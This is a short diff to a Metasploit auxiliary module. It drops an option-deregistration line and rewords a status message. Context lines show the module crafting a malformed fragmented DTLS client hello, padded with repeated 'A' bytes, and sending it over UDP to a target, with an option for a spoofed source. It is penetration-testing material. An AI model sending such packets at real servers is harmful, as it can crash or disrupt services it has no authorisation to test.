@@ -42,7 +42,6 @@ class Metasploit3 < Msf::Auxiliary
       OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
     ], self.class)
 
-    deregister_options('FILTER','PCAPFILE', 'INTERFACE', 'SNAPLEN', 'TIMEOUT')
   end
 
   def build_tls_fragment(type, length, seq, frag_offset, frag_length, frag_body=nil)
@@ -77,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
     fragments << build_tls_fragment(1, 1234, 0, 0, 123, 'A' * 1234)
     message = build_tls_message(22, datastore['VERSION'], 0, 0, fragments)
     connect_udp
-    print_status("Sending fragmented DTLS client hello packet to #{rhost}:#{rport}")
+    print_status("#{rhost}:#{rport} - Sending fragmented DTLS client hello packet")
     udp_sock.put(message)
     disconnect_udp
   end
